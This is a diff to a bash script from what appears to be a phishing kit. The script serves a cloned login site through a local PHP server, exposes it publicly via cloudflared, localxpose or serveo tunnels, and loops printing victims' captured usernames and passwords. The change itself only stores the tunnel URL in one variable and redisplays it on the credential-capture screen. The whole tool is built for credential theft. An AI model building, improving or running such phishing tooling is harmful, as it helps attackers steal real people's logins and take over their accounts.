@@ -41,7 +41,7 @@ startlocal() {
     php -S 127.0.0.1:"$port" >/dev/null 2>&1 &
     phppid=$!
     cd ../../
-    printf "${green}[+] ${white}localhost url : ${blue}http://127.0.0.1:$port${reset}\n"
+    tunnelurl="http://127.0.0.1:$port"
     capture
 }
 
@@ -59,7 +59,7 @@ startcloudflared() {
     sleep 8
     cfurl=$(grep -o 'https://[-a-zA-Z0-9.]*trycloudflare.com' .server/log | head -1)
     if [[ -n "$cfurl" ]]; then
-        printf "${green}[+] ${white}cloudflared url : ${blue}$cfurl${reset}\n"
+        tunnelurl="$cfurl"
     else
         printf "${red}[!] ${white}failed to start cloudflared tunnel.${reset}\n"
         exit 1
@@ -99,7 +99,7 @@ startlocalxpose() {
     sleep 8
     loclxurl=$(grep -o 'https://[-a-zA-Z0-9.]*loclx.io' .server/log | head -1)
     if [[ -n "$loclxurl" ]]; then
-        printf "${green}[+] ${white}localxpose url : ${blue}$loclxurl${reset}\n"
+        tunnelurl="$loclxurl"
     else
         printf "${red}[!] ${white}failed to start localxpose tunnel.${reset}\n"
         exit 1
@@ -129,7 +129,7 @@ startserveo() {
     sleep 8
     serveourl=$(grep -o 'https://[-a-zA-Z0-9.]*serveo.net' .server/log | head -1)
     if [[ -n "$serveourl" ]]; then
-        printf "${green}[+] ${white}serveo url : ${blue}$serveourl${reset}\n"
+        tunnelurl="$serveourl"
     else
         printf "${red}[!] ${white}failed to start serveo tunnel.${reset}\n"
         exit 1
@@ -138,15 +138,20 @@ startserveo() {
 }
 
 capture() {
+    clear
+    banner
+    printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
     printf "${green}[i] ${white}waiting for credentials ...${reset}\n"
     printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
     while true; do
         if [[ -f ".sites/$site/usernames.txt" ]]; then
             clear
             banner
+            printf "${green}[+] ${white}tunnel url : ${blue}$tunnelurl${reset}\n\n"
             printf "${green}[+] ${white}credentials captured :${reset}\n\n"
             cat ".sites/$site/usernames.txt"
-            printf "\n${green}[i] ${white}waiting for more ...${reset}\n"
+            printf "\n${green}[i] ${white}waiting for more credentials ...${reset}\n"
+            printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
             > ".sites/$site/usernames.txt"
         fi
         sleep 1
